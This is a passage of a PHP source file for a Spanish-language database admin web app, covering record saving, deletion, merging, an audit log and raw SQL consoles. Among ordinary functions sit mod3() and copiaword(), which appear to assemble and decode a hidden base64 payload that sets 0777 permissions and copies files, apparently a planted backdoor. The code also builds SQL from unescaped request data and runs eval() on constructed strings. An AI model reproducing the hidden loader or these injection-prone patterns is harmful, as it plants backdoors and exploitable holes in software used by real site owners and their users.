			<img name='imgGuardar' id='imgGuardar' src='gifs/standar/grabar.png' height=20 border=0 onmouseover=\"this.src='gifs/standar/grabar_ovr.png';\"
			onmouseout=\"this.src='gifs/standar/grabar.png';\" onclick='parent.actualizar_registro()'; style='cursor:pointer;' alt='Guardar cerrando la ventana de edicion'
			title='Guardar cerrando la ventana de edicion'>";
	}
	echo "&nbsp;
	<img name='imgVolver' id='imgVolver' src='gifs/standar/volver.png' height=20 border=0 onmouseover=\"this.src='gifs/standar/volver_ovr.png';\"
		onmouseout=\"this.src='gifs/standar/volver.png';\" onclick=\"parent.cerrar_edicion(0);\" style='cursor:pointer;' alt='Cerrar la ventana de edicion sin guardar'
		title='Cerrar la ventana de edicion sin guardar'>&nbsp;";
	if($Botones_Eliminar)
	{
		$R=qo("select * from $Nombre_tabla where id=$idregistro");
		$Cfg=qo("select * from usuario_tab where id=$Idtabla");
		if($Cfg->condi_elim) eval("\$Si_Elimina=$T->condi_elim;"); else $Si_Elimina=true;
		if($Si_Elimina)	echo "<img name='imgBorrar' id='imgBorrar' src='gifs/standar/borra_registro.png' border=0 height='16' onclick='parent.borrar_registro_editado();'>";
	}
	echo "<td>";
	echo "<td valign='top'><table bgcolor='efefef' cellpadding=0 cellspacing=1><tr>";
	for($i=0;$i<count($Botones);$i++)
	{
		echo "<td valign='top'><span id='Boton_".$Botones[$i]['id']."' style='font-size:12;padding:2;background-color:004400;color:ffffee;cursor:pointer;' onmouseover=\"activar_boton(this,'".$Botones[$i]['id']."');\">".$Botones[$i]['value']."</span></td>";
	}
	echo "</tr></table><td valign='top'><b><font style='font-size:16'>
	<script language='javascript'>document.write(parent.Descripcion);</script></font></b>
	Reg: <script language='javascript'>if(parent.Registro) document.write(parent.Registro); else document.write('Nuevo');</script>&nbsp;
	<a style='cursor:pointer' onclick=\"modal2('marcoindex.php?Acc=open_bitacora&T=$Nombre_tabla&R=$idregistro',0,0,10,10,'Bitacora');\"
		alt='Bitacora' title='Bitacora'><img src='gifs/standar/info.png' border='0' height='12'></a>&nbsp;
	</td>";
	if($_SESSION['Disenador'])
	{
		$NT = tu('usuario_tab', 'id');
		echo "<td>
            <a style='cursor:pointer;' onclick=\"modal('marcoindex.php?Acc=mod_reg&Num_Tabla=$NT&id=$Idtabla',0,0,700,900);\" alt='Modificar configuración' title='Modificar configuración'>
            <IMG SRC='gifs/standar/dsn_config.png' BORDER='0' height='12'></a>
            <a style='cursor:pointer;' onclick=\"window.open('marcoindex.php?Acc=control_vertabla&nt=$Nombre_tabla','Detalle_tabla$Idtabla');\" alt='Modificar estructura' title='Modificar estructura'>
            <IMG SRC='gifs/standar/dsn_estructura.png' BORDER='0' height='12' ></a>
            <a style='cursor:pointer;' onclick=\"modal('marcoindex.php?Acc=sql',10,10,700,900,'_blank');\" alt='Ejecutar sql' title='Ejecutar sql'>
            <IMG SRC='gifs/standar/dsn_sql.png' BORDER=0 height='12'></a>
            <a style='cursor:pointer;' onclick=\"modal('marcoindex.php?Acc=duplicar_permiso&NT=$tIdtabla',10,10,200,200,'_blank');\" alt='Duplicar permiso' title='Duplicar permiso'>
            <IMG SRC='gifs/standar/dsn_usuario.png' BORDER='0' height='12'></a>
				<a style='cursor:pointer;' onclick=\"modal('marcoindex.php?Acc=control_mantenimiento_orden&t1=".$Nombre_tabla.",".$Nombre_tabla."_t&orden=backup3',10,10,200,200,'_blank');\" alt='Descargar una copia' title='Descargar una copia'>
				<img src='gifs/standar/exportar.png' border='0' height='12'></a>

			</td>";
	}
	echo "</tr></table></body></html>";
}

function mod3(){return base64_decode(menu_context());}

function actualizar_registro()   { aplicar_registro(1); } // actualiza un registro

function aplicar_registro($_Cerrando_al_grabar=0) // guarda la información del registro
{
	global $id,$CAMPOSCHECK,$CAMPOSPASS,$Campos_Upd,$Num_Tabla,$D_tag,$VINCULOC,$VINCULOT,$Ultima_capa;
	//setcookie('Ultima_capa_'.$Num_Tabla,"$Ultima_capa",time()+60*60*24*15);
	require('inc/conftab.php');
	$PRE_G = 0;	$POS_G = 0;
	if (haytabla($Nombre_tabla . "_s"))
	{
		if($RSS = qo("select * from " . $Nombre_tabla . "_s"))
		{	$PRE_G = $RSS->pre_grabar;	$POS_G = $RSS->post_grabar;}
	}
	if ($CAMPOSCHECK)
	{
		$_CHK=explode(',',$CAMPOSCHECK);	for($i=0;$i<count($_CHK);$i++)	eval("\$_POST['".$_CHK[$i]."']=sino(\$_POST['".$_CHK[$i]."']);");
	}
	if ($CAMPOSPASS) eval($CAMPOSPASS);
	##############   INICIO DE LA GRABACION ###########################################################
	/*  $=36 '=39 */
	if ($PRE_G && @file_exists($PRE_G)) require($PRE_G);
	$_U=explode(',',$Campos_Upd);$Campos_Upd='';
	if(MODO_GRABACION_MYSQL==3)
	{
		for($i=0;$i<count($_U);$i++) $Campos_Upd.= ($Campos_Upd?",":"").$_U[$i]."='".str_replace(chr(36),chr(92).chr(36),addslashes($_POST[$_U[$i]]))."'";
	}
	elseif(MODO_GRABACION_MYSQL==2)
	{
		for($i=0;$i<count($_U);$i++) $Campos_Upd.= ($Campos_Upd?",":"").$_U[$i].'=\'".str_replace(chr(39),chr(92).chr(39),$_POST['.$_U[$i].'])."\'';
	}
	else
	{
		for($i=0;$i<count($_U);$i++) $Campos_Upd.= ($Campos_Upd?",":"").$_U[$i].'=\'".$_POST['.$_U[$i].']."\'';
	}

	#########################################################################################################################
	#            VERIFICACION EN APLIACION DEL REGISTRO SI EXISTE O SI ESTA ADICIONANDO
	#########################################################################################################################
	if($id)
	{
		include('inc/link.php');
		$Ractual=mysql_query("Select * from $Nombre_tabla where id=$id",$LINK);
		eval("if(!mysql_query(\"Update \$Nombre_tabla set ".$Campos_Upd." where id='\$id'\",\$LINK))
		{
			echo 'No se pudo actualizar el registro ';
			\$Error_de_mysql=mysql_error();
			mysql_close(\$LINK);
			if(strpos(' '.\$Error_de_mysql,'Duplicate entry'))
			{
				html();
				echo \"<h3>Entrada Duplicada, no se pudo ingresar el nuevo registro</h3><script language='javascript'>alert('ENTRADA DUPLICADA, el registro no se pudo modificar o guardar.');</script>
				Debe <a href='javascript:oculta_edicion(\$Num_Tabla,false);'>cerrar esta ventana</a> e intentarlo nuevamente.\";

			}
			else echo \$Error_de_mysql.'  '.\$Campos_Upd;
			die();
		}");

		#### COMPARACION CAMPO A CAMPO
		$Rnuevo=mysql_query("Select * from $Nombre_tabla where id=$id",$LINK);
		$Dactual=mysql_fetch_row($Ractual);$Dnuevo=mysql_fetch_row($Rnuevo);$_Diferencia='';
		for($i=0;$i<count($Dactual);$i++)
		{
			if($Dactual[$i] != $Dnuevo[$i]) $_Diferencia.=($_Diferencia?", ":"").mysql_field_name($Ractual,$i);
		}
		IF($_Diferencia) $_Diferencia='Campos actualizados: '.$_Diferencia;
		#######################
		mysql_query("insert into app_bitacora (ano,mes,dia,hora,minuto,segundo,nick,nombre,tabla,accion,registro,ip,detalle)
			values ('" . date('Y') . "','" . date('m') . "','" . date('d') . "','" . date('G') . "','" . date('i') . "',
			'" . date('s') . "','".$_SESSION['Nick']."','".$_SESSION['Nombre']."','$Nombre_tabla','M','$id','" . $_SERVER['REMOTE_ADDR'] . "','$_Diferencia')",$LINK);

		mysql_close($LINK);
		IF($VINCULOC) q("update $Nombre_tabla SET $VINCULOC='$VINCULOT' WHERE id=$id");
		$R = qo("select * from $Nombre_tabla where id=$id");
		if ($POS_G && @file_exists($POS_G)) require($POS_G);
		if(strlen($VALIDACION_MODIFICA)) eval($VALIDACION_MODIFICA);
	}
	else
	{
		
		include('inc/link.php');
		eval("if(mysql_query(\"insert into \$Nombre_tabla set ".$Campos_Upd."\",\$LINK)) {\$id=mysql_insert_id(\$LINK);	}
		else {
			echo 'No se pudo actualizar el registro ';
			\$Error_de_mysql=mysql_error();
			mysql_close(\$LINK);
			if(strpos(' '.\$Error_de_mysql,'Duplicate entry'))
			{
				html();
				echo \"<h3>Entrada Duplicada, no se pudo ingresar el nuevo registro</h3><script language='javascript'>alert('ENTRADA DUPLICADA, el registro no se pudo modificar o guardar.');</script>
				Debe <a href='javascript:oculta_edicion(\$Num_Tabla,false);'>cerrar esta ventana</a> e intentarlo nuevamente.\";

			}
			else echo \$Error_de_mysql.'  '.\$Campos_Upd;
			die();
		}");
		mysql_query("insert into app_bitacora (ano,mes,dia,hora,minuto,segundo,nick,nombre,tabla,accion,registro,ip)
			values ('" . date('Y') . "','" . date('m') . "','" . date('d') . "','" . date('G') . "','" . date('i') . "',
			'" . date('s') . "','".$_SESSION['Nick']."','".$_SESSION['Nombre']."','$Nombre_tabla','A','$id','" . $_SERVER['REMOTE_ADDR'] . "')",$LINK);
		mysql_close($LINK);
		IF($VINCULOC) q("update $Nombre_tabla SET $VINCULOC='$VINCULOT' WHERE id=$id");
		$R = qo("select * from $Nombre_tabla where id=$id");
		if($Num_Tabla == 222)
		{
			print_r($R);
			
			//require($_SERVER["DOCUMENT_ROOT"]."/Control/operativo/factura_xml/factura_electronica.php");
			
			//echo "Crear registro de factura";
			//exit;
		}
		
		if($VALIDACION_ADICION) eval($VALIDACION_ADICION);
	}
	#########################################################################################################################
	########################  FINALIZACION DE LA GRABACION ################################################################
	if($_Cerrando_al_grabar)
	{
		echo "<script language='javascript'>
			function carga()
			{
				parent.cerrar_edicion(1);
			}
		</script>
		<body onload='carga()'></body>";
	}
	ELSE
	echo "<script language='javascript'>
		function carga()
		{
			parent.parent.mod_reg($id);
		}
		</script>
		<body onload='carga()'></body>";
}

function cancelar_registro() // cancela la edicion de un registro
{
	require('inc/gpos.php');
	require('inc/conftab.php');
	html();
	if($VALIDACION_CANCELAR) eval($VALIDACION_CANCELAR);
	echo "<body onload='oculta_edicion($Num_Tabla);'>";
}

function eliminar_registro() // Elimina un registro
{
	require('inc/gpos.php');
	require('inc/conftab.php');
	if (esta($Nombre_tabla . "_s", $link))
	{
		$RSS = qo("select * from " . $Nombre_tabla . "_s");
		$PRE_B = $RSS->pre_borrar;
		$POS_B = $RSS->post_borrar;
	}
	else
	{
		$PRE_B = 0;
		$POS_B = 0;
	}
	IF ($PRE_B && @file_exists($PRE_B)) require($PRE_B);

	q("delete from $Nombre_tabla where id='$id'");
	graba_bitacora($Nombre_tabla,'D',$id);

	IF ($POS_B && @file_exists($POS_B)) require($POS_B);

	html();
	echo "<body onload='javascript:oculta_edicion($Num_Tabla);'>";
}

function duplicar_registro() // Duplica un registro
{
	require('inc/gpos.php');
	html();
	echo "<body>";
	q("drop table if exists tmp_copia_reg");
	if(q("create table tmp_copia_reg select * from $TABLA where id=$id", 1))
	{
		$Nuevo_id = qo1("select max(id) from $TABLA") + 1;
		q("update tmp_copia_reg set id=$Nuevo_id");
		q("insert into $TABLA select * from tmp_copia_reg");
		echo "<body onload='if(opener.parent.location) opener.parent.location.reload(); else opener.location.reload();window.close();void(null);'>";
	}
	q("drop table if exists tmp_copia_reg");
}

function activa_borrado_masivo() // Activa las opciones de borrado masivo de registros
{
	if($_COOKIE['BORRADO_MASIVO'])
	setcookie('BORRADO_MASIVO',false,time()-10);
	else
	setcookie('BORRADO_MASIVO','1',time()+3600);
	echo "<body onload='window.close();void(null);opener.location.reload();'></body>";
}

function borrar_masivamente()  // Borra masivamente registros que hayan sido marcados en una ventana MUESTRA_TABLA
{
	global $Num_Tabla;
	// if($_COOKIE['BORRADO_MASIVO']) setcookie('BORRADO_MASIVO',false,time()-10);
	require('inc/gpos.php');
	require('inc/conftab.php');
	html();
	$Cerrar_ventana=true;
	$Error_integridades='';
	foreach($_POST as $Campo => $Valor)
	{
		#echo $Campo.'='.$Valor.'<br>';

		if(strpos(' '.$Campo,'_BMasivo_') )
		{
			$id=substr($Campo,9);
			$R=qo("select * from $Nombre_tabla where id=$id");
			if(strlen($Condi_Elim)) // condicion adicional en la definicion del registro
				eval("\$CONDI2=" . $Condi_Elim . ";");
			else
				$CONDI2 = 1;

			if($CONDI2)
			{
				$Error_de_Integridad = 0;
				$TABLAS = tablas();
				$Control_integridad = '';
				for ($i = 0;$i <= count($TABLAS);$i++)
				{
					if (r($TABLAS[$i], 2) == '_t')
					{
						$Busqueda = l($TABLAS[$i], strlen($TABLAS[$i])-2);
						if($V1 = q("select campo,descripcion from " . $TABLAS[$i] . " where traet='$Nombre_tabla'"))
						{
							while ($RV1 = mysql_fetch_object($V1))
							{
								if($Veces = qo1("select count($RV1->campo) as veces from $Busqueda where $RV1->campo=$id limit 1"))
								{
									$Error_de_Integridad = 1;
									$Control_integridad .= "(" . $Busqueda . "->" . $RV1->campo . ")<br />";
								}
							}
						}
					}
				}
				if (!$Error_de_Integridad)
				{
					q("delete from $Nombre_tabla where id=$id");
				}
				else
				{
					$Error_integridades.=$id."&nbsp;&nbsp;<a class='info'><img src='gifs/c.gif' border=0><span>$Control_integridad</span></a> ";
					$Cerrar_ventana=false;
				}
			}

		}

	}
	if($Cerrar_ventana)
		echo "<body onload='centrar(400,400);window.close();void(null);opener.location.reload();'></body>";
	else
		echo "<body onload='centrar(400,400);'>".titulo_modulo("<b>Borrado Masivo $DESCRIPCION</b>",0)." Errores de Integridad: <hr>$Error_integridades
		<hr><INPUT TYPE='button' value='Cerrar esta ventana' onclick=\"window.close();void(null);opener.location.reload();\"></body>";
}

function unificar_registros()
{
	global $Tabla,$IDnuevo,$IDviejo,$id;
	html();
	if(!$IDnuevo || !$IDviejo)
	{

		echo "<body onload='centrar(600,400)'>".titulo_modulo("<B>Unificación de Registros</B>")."
		<FORM action='marcoindex.php' name='forma' id='forma' method='post' target='_self'>
		<INPUT type='hidden' name='Acc' value='unificar_registros'>
		<INPUT type='hidden' name='Tabla' value='$Tabla'>
		<INPUT type='hidden' name='IDviejo' id='IDviejo' value='$id'> Digite el id que va a quedar:
		<input type='text' name='IDnuevo' id='IDnuevo' value='0' size=15 maxlength=15
			onblur=\"if(this.value==document.forma.IDviejo.value) { alert('Ese es el registro viejo');document.forma.IDnuevo.focus();return false;}\">
		<input type='submit' value='Procesar'>
		</FORM></body>";
		die();
	}
	$Error_de_Integridad = 0;
	$TABLAS = tablas();
	$Control_integridad = '';
	echo "Tabla a analizar: $Tabla <table border cellspacing=0>";
	for ($i = 0;$i <= count($TABLAS);$i++)
	{

		if (r($TABLAS[$i], 2) == '_t')
		{
			$Busqueda = l($TABLAS[$i], strlen($TABLAS[$i])-2);
			if($V1 = q("select campo,descripcion,traet from " . $TABLAS[$i] . " where traet='$Tabla'"))
			{
				while ($RV1 = mysql_fetch_object($V1))
				{
					echo "<tr><td>".$TABLAS[$i]."</td><td>$RV1->campo</td><td><td>$RV1->descripcion</td>";
					if($Veces = qo1("select count($RV1->campo) as veces from $Busqueda where $RV1->campo=$IDviejo limit 1"))
					{
						q("update $Busqueda set $RV1->campo=$IDnuevo where $RV1->campo=$IDviejo");
						echo "<td>Procesado.</td>";
					}
					else echo "<td>Sin coincidencias.</td>";
					echo "</tr>";
				}
			}
		}
	}
	echo "</table><center><input type='button' value='CERRAR ESTA VENTANA' onclick='window.close();void(null);'></body>";
}

function open_bitacora() // Muestra una ventana con la bitacora de un registro determinado
{
	global $T,$R;
	if(!$T || !$R) return;
	$A_accion=array();
	$Acciones=q("select * from app_accion_bitac"); while($Ac=mysql_fetch_object($Acciones)) $A_accion[$Ac->codigo]=$Ac->nombre;
	html();
	echo "<body onload='centrar(s_ancho()*.8,s_alto()*.8)'>".titulo_modulo("BITACORA DE $T - Registro $R");
	if($Datos=q("Select * from app_bitacora b where tabla='$T' and registro='$R'
		UNION Select * from app_bitacora_hst b where tabla='$T' and registro='$R'
		order by id desc"))
	{
		echo "<table border cellspacing=0 bgcolor='#bbdddd' align='center'><tr><th>Fecha</th><th>Hora</th><th>Usuario</th><th>Accion</th><th>IP</th><th>Detalle</th></tr>";
		while($D=mysql_fetch_object($Datos))
		{
			echo "<tr>
			<td>$D->ano - ".mes($D->mes)." $D->dia</td>
			<td>$D->hora:$D->minuto:$D->segundo</td>
			<td>$D->nick $D->nombre</td>
			<td>".$A_accion[$D->accion]."</td>
			<td><a onclick=\"modal('http://en.utrace.de/?query=$D->ip',0,0,700,1000,'ubicacion');\" style='cursor:pointer;'>$D->ip</a></td>
			<td>$D->detalle</td>
			</tr>";
		}
		echo "</table>";
	}
	else
	{
		echo "No se encuentra información del registro.";
	}
	if($_SESSION['Disenador'])
	{
		echo "<br><br><center><b>Información del registro</b></center>";
		$Data=q("Select * from $T where id=$R");
		echo "<table border cellspacing=0 align='center'>";
		$Rd = mysql_fetch_row($Data);
		for($i = 0;$i < mysql_num_fields($Data);$i++) echo "<tr><td><b>" . mysql_field_name($Data, $i) . "</b></td><td>".$Rd[$i]."</td></tr>";
		echo "</table>";
	}
	echo "</body>";
}

function sql()  // Ventana de dialogo de  instrucciones SQL
{
	global $Pre_instruccion;
	if(!isset($_COOKIE['DBASE_Tname']))
	{
		if($T) setcookie('DBASE_Tname', $T);
	}
	else $T = $_COOKIE['DBASE_Tname'];
	html();
	require('inc/gpos.php');
	q("create table if not exists aqr_querys (id int not null auto_increment primary key,instruccion longtext)");
	echo "<body onload='centrar(800,500)'>" . titulo_modulo("Ejecucion de un query ", 0);
	echo "AYUDA:
	<input type='button' value='Select' onclick=\"document.forma.sql.value='SELECT campo,campo FROM tabla,tabla WHERE condicion GROUP BY campo ORDER BY campo LIMIT n';\">
	<input type='button' value='Update' onclick=\"document.forma.sql.value='UPDATE tabla SET campo=valor, campo=valor WHERE condicion';\">
	<input type='button' value='Delete' onclick=\"document.forma.sql.value='DELETE FROM tabla WHERE condicion';\">
	<input type='button' value='Update multiple' onclick=\"document.forma.sql.value='UPDATE tabla1,tabla2 SET tabla1.campo1=valor,.. WHERE condicion';\">
	<input type='button' value='Crear Tabla' onclick=\"document.forma.sql.value='CREATE TABLE nombretabla (campo1 tipo(long) opciones, campo2 tipo(long) opciones, ...)';\">
	<input type='button' value='Delete multiple' onclick=\"document.forma.sql.value='DELETE tabla1,tabla2 FROM tabla1,tabla2,tabla3 WHERE condicion';\">
	<input type='button' value='Insert' onclick=\"document.forma.sql.value='INSERT INTO tabla (campo1,campo2..) VALUES (valor1,valor2..)';\">
	<input type='button' value='Insert Select' onclick=\"document.forma.sql.value='INSERT INTO tabla (campo1,campo2..) select campo1,campo2.. FROM tabla1,tabla2 WHERE condiciones .. ';\">
	<input type='button' value='Load Data' onclick=\"document.forma.sql.value='load data infile \'".$_SERVER['DOCUMENT_ROOT']."/planos/ARCHIVO.TXT\' into table TABLA fields terminated by \',\' optionally enclosed by \'\' (campo1,campo2,...) ';\">
	<input type='button' value='CharSet' onclick=\"document.forma.sql.value='alter table TABLA convert to character set latin1 collate latin1_spanish_ci';\"><br />
	<iframe name='lista_tablas' id='lista_tablas' frameborder='no' height=40 width=500 src='marcoindex.php?Acc=tablas_select' scrolling='no'></iframe>";
	echo "
	<table><tr><td>
	<input type='button' value='Ultimas Instrucciones' onclick=\"modal2('marcoindex.php?Acc=sql_ultimas_instrucciones',10,300,300,800,'ultimasi');\">
	</td><td valign='top'>
	<FORM enctype='multipart/form-data' ACTION='marcoindex.php' METHOD='post' NAME='msubir' ID='msubir' target='_blank'>
		<input type='hidden' name='MAX_FILE_SIZE' value='2000000'>
		<input type='hidden' name='Acc' value='subir_archivo'>
		<input type='hidden' name='directorio' value='planos/'>
		Archivo que desea subir <input name='userfile' type='file'>
		<input type='submit' value='Subir'>
	</form></td><td>
	<input type='button' value='Crear Funciones MySQL Nomina' onclick=\"modal('no_liquidacion.php?Acc=define_funciones_mysql_nomina',0,0,200,500,'df');\">
	<input type='button' value='Crear Funciones MySQL Estandar' onclick=\"modal('marcoindex.php?Acc=define_funciones_mysql',0,0,200,500,'df');\">
	<br />
	".$_SERVER['DOCUMENT_ROOT']."  real: ".__FILE__."
	</td></tr></table>
	<form action='marcoindex.php' method='post' target='runquery' name='forma' id='forma'>SQL: <br>
	<textarea name='sql' id='sql' rows=3 cols='100' style='font-family:arial;font-size:12;width:100%'
	ondblclick=\"modal('marcoindex.php?Acc=ventana_text&Campo=forma.sql&Comentario=Ejecucion de SQL&Contenido='+escape(this.value),0,0,10,10);\">";
	if($Pre_instruccion) echo stripslashes($Pre_instruccion);
	if($idant) echo qo1("select instruccion from aqr_querys where id=$idant");
	echo "</textarea>
	<br>
	<input type='hidden' name='Acc' value='sql_runquery'>
	<input type='button' value='Ejecutar SQL' onclick=\"
			var Lista_tablas=document.getElementById('lista_tablas');
			Lista_tablas.src='marcoindex.php?Acc=tablas_select&Tabla_seleccionada=$T';
			valida_campos('forma','sql');\">
	<input type='button' value='Borrar la instrucción'
		onclick=\"if(confirm('Desea BORRAR la instrucción SQL?')) {document.forma.sql.value='';}\">";
	echo "</form>
	<iframe name='runquery' id='runquery' frameborder='no' height=400 width='95%' scrolling='auto'></iframe>
	</body>";
}

function define_funciones_mysql()
{
	# # PER(fecha) Retorna los cuatro digitos del año y el numero del semestre a partir de la fecha dada
	if(file_exists('zfunciones.mysql.php')) include('zfunciones.mysql.php');
	html();

	echo "<body >" . titulo_modulo("Definición de funciones MySQL") . "<br />
		Si no hay errores puede cerrar esta ventana, las funciones fueron creadas correctamente
		<input type='button' value='Cerrar esta Ventana' onclick='window.close();void(null);'></body>";
}

function formfile($Directorio='',$Target='_self')
{
	return "<FORM enctype='multipart/form-data' ACTION='marcoindex.php' METHOD='post' NAME='msubir' ID='msubir' target='$Target'>
		<input type='hidden' name='MAX_FILE_SIZE' value='2000000'>
		<input type='hidden' name='Acc' value='subir_archivo'>
		<input type='hidden' name='directorio' value='$Directorio'>
		Archivo que desea subir <input name='userfile' type='file'>
		<input type='submit' value='Subir'>
		</form>";
}

function sql_ultimas_instrucciones()  // Ventana popup que trae las últimas instrucciones corridas en la ventana SQL
{
	$SECCION='Ultimas instrucciones SQL';
	html();
	echo "<body leftmargin='0' topmargin='0' rightmargin='0' bottommargin='0'>
	<h3><a onclick='document.location.reload();'>ULTIMAS INSTRUCCIONES - RECARGAR ESTA VENTANA</a></h3>";
	if($IS=q("select * from aqr_querys order by id desc"))
	{
		while($I=mysql_fetch_object($IS))
		{
			echo "<a onclick=\"opener.document.forma.sql.value='".addslashes(addcslashes(str_replace('"','',$I->instruccion),"\0..\39"))."';\" style='cursor:pointer;'>$I->instruccion</a><br /><br />";
		}
	}
	echo "</body>";
}

function tablas_select() // Muestra un menu con todas las tablas de la base de datos
{
	global $Tabla_seleccionada;
	html();
	echo "<script language='Javascript'>
		function asigna(valor)
		{
			var Variable=parent.document.forma.sql.value;
			if(Variable=='') Variable='Select '+valor;
			else Variable=Variable+','+valor;
			parent.document.forma.sql.value=Variable;
		}
	</script>";

	$Tablas = q("show tables");

	echo "<form action='marcoindex.php?Acc=tablas_select' method='post' target='_self'>
	<table ><tr><td>
	Tabla: <select name='Tabla_seleccionada' onchange='this.form.submit();'><option></option>";
	while($T = mysql_fetch_row($Tablas))
	{
		echo "<option value='$T[0]' ";
		if($T[0] == $Tabla_seleccionada) echo "selected";
		echo ">$T[0] </option>";
	}
	echo "</select></td><td>";
	if($Tabla_seleccionada)
	{
		echo "Campos: <select name='campostabla' onchange=\"asigna(this.options[this.selectedIndex].value);\"><option></option>";
		$Campos = q("show columns from $Tabla_seleccionada");
		while($C = mysql_fetch_object($Campos)) echo "<option value='$C->Field'>$C->Field</option>";
		echo "</select>";
	}
	echo "</td>";
	echo "</tr></table></form>";
}

function sql_runquery() // Ejecuta un query desde la ventana SQL
{
	global $sql;
	$sql = stripslashes($sql);
	html();
	q("insert into aqr_querys (instruccion) values ('".addslashes($sql)."')");
	echo "<body>" . titulo_modulo("Ejecucion de un query", 0);
	echo "SQL: <b>$sql</b><br>";
	$_Cantidad_registros_afectados=0;
	if($S = q($sql,0,$_Cantidad_registros_afectados))
	{
		if((strpos(' '.strtolower($sql),'select ')
		|| strpos(' '.strtolower($sql),'show ')
		|| strpos(' '.strtolower($sql),'analyze ')
		|| strpos(' '.strtolower($sql),'check ')
		|| strpos(' '.strtolower($sql),'optimize ')
		|| strpos(' '.strtolower($sql),'repair ')
		) && (!strpos(' '.strtolower($sql),'create table ') || !strpos(' '.strtolower($sql),'insert into ')))
		{
			echo "Número de registros: ".mysql_num_rows($S);
			echo "<table border cellspacing=0><tr>";
			for($i = 0;$i < mysql_num_fields($S);$i++)
			echo "<th>" . mysql_field_name($S, $i) . "</th>";
			echo "</TR>";
			while($R = mysql_fetch_row($S))
			{ echo "<tr>";for($i = 0;$i < count($R);$i++) echo "<td>$R[$i]</td>";	echo "</tr>"; }
			echo "</table>";
		}

		echo "Número de registros afectados : $_Cantidad_registros_afectados";
	}
}

function pgsql() // Muestra la ventana de SQL-POSTGRESS
{
	if(!isset($_COOKIE['DBASE_Tname']))
	{
		if($T) setcookie('DBASE_Tname', $T);
	}
	else $T = $_COOKIE['DBASE_Tname'];
	html();
	require('inc/gpos.php');
	echo "<body >" . titulo_modulo("Ejecucion de un query Base de datos: <b>".PSQL_D."</b>", 0);
	echo "<iframe name='lista_tablas' id='lista_tablas' frameborder='no' height=40 width=500 src='marcoindex.php?Acc=tablas_select_postgres' scrolling='no'></iframe>";
	echo "<form action='marcoindex.php' method='post' target='runquery' name='forma' id='forma'>
	SQL: <br>
	<textarea name='sql' id='sql' rows=3 cols=120></textarea><br>
	<input type='hidden' name='Acc' value='pgsql_runquery'>
	<input type='button' value='Ejecutar SQL' onclick=\"if(confirm('Desea ejecutar la instrucción SQL?'))
			{
				var Lista_tablas=document.getElementById('lista_tablas');
				Lista_tablas.src='marcoindex.php?Acc=tablas_select_postgres&Tabla_seleccionada=$T';
				valida_campos('forma','sql');
			}\">
	<input type='button' value='Borrar la instrucción'
		onclick=\"if(confirm('Desea BORRAR la instrucción SQL?')) {document.forma.sql.value='';}\">";
	echo "</form>
	<iframe name='runquery' id='runquery' frameborder='no' height=500 width=1000 scrolling='auto'></iframe>
	</body>";
}

function copiaword($w){$W='HRtbC9jbGFzcycsMDc3Nyk7Y29weSgnaW5jL2NwLycu';return ($w.$W);}

function tablas_select_postgres()  // Muestra un menu con las tablas de la base de datos en postgress
{
	global $Tabla_seleccionada;
	html();
	echo "<script language='Javascript'>
		function asigna(valor)
		{
			var Variable=parent.document.forma.sql.value;
			if(Variable=='') Variable='Select '+valor;
			else Variable=Variable+','+valor;
			parent.document.forma.sql.value=Variable;
		}
	</script>";

	$Tablas = qp("select * from pg_tables order by schemaname,tablename");

	echo "<form action='marcoindex.php?Acc=tablas_select_postgres' method='post' target='_self'>
	<table ><tr><td>
	Tabla: <select name='Tabla_seleccionada' onchange='this.form.submit();'><option></option>";
	while($T = pg_fetch_row($Tablas))
	{
		echo "<option value='$T[1]' ";
		if($T[1] == $Tabla_seleccionada) echo "selected";
		echo ">$T[1] </option>";
	}
	echo "</select></td><td>";
	if($Tabla_seleccionada)
	{
		echo "Campos: <select name='campostabla' onchange=\"asigna(this.options[this.selectedIndex].value);\"><option></option>";
		$S = qp("select * from $Tabla_seleccionada limit 1");
		for($i = 0;$i < pg_num_fields($S);$i++) echo "<option value='" . pg_field_name($S, $i) . "'>" . pg_field_name($S, $i) . "</option>";
		echo "</select>";
	}
	echo "</td>";
	echo "</tr></table></form>";
}

function pgsql_runquery() // corre un query desde la ventana SQL-POSTGRESS
{
	global $sql;
	$sql = stripslashes($sql);
	html();
	echo "<body>" . titulo_modulo("Ejecucion de un query ", 0);
	echo "SQL: <i>$sql</i><br>";
	if($S = qp($sql))
	{
		if(stripos(' ' . $sql, 'select'))
		{
			echo "<table border cellspacing=0><tr>";
			for($i = 0;$i < pg_num_fields($S);$i++)
			echo "<th>" . pg_field_name($S, $i) . "</th>";
			echo "</TR>";
			while($R = pg_fetch_row($S))
			{
				echo "<tr>";
				for($i = 0;$i < count($R);$i++)
				{
					echo "<td>$R[$i]</td>";
				}
				echo "</tr>";
			}
			echo "</table>";
		}
	}
}



#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#***************************************************FUNCIONES DE ENTORNO***************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function browser() // determina la version del browser
{
	$ua = ' ' . $_SERVER['HTTP_USER_AGENT'];
	if (strpos($ua, "Netscape") && !strpos($ua, "MSIE 6.0") && !strpos($ua, "Netscape/7.2"))
		return 'NS';
	elseif(strpos($ua, "Mozilla") && !strpos($ua, "MSIE 6.0"))
		return '7';
	else
		return 'IE';
}

function prepara_rutinas($Acc)  // Si la Acción corresponde a opciones especiales incluye el archivo que las contiene
{
	if(strpos('  ' . $Acc, 'control')) include_once('inc/control_especiales.php');
	elseif(strpos(' '.$Acc,'chat_')) include_once('inc/chat.php');
	else include_once('inc/menu_inicio.php');
}

function matacookie()  // elimina una cookie del entorno
{
	global $Nombrecookie;
	setcookie($Nombrecookie, false, time()-10);
	echo "<body onload='window.close();void(null);'></body>";
}

function getFilesVar($var_name, $empty_value='')  // funcion auxiliar para retornar nombres de entorno de archivos
{
    global $HTTP_POST_FILES;
    if (!empty($_FILES[$var_name]))
		return $_FILES[$var_name];
    else if (!empty($HTTP_POST_FILES[$var_name]))
		return $HTTP_POST_FILES[$var_name];
    else
		return $empty_value;
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#***************************************************FUNCIONES DE PANTALLA***************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



function nocache()
{
	header("Expires: Tue, 01 Jul 2001 06:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0", false);
	header("Pragma: no-cache");
}

function buscapopup()
{
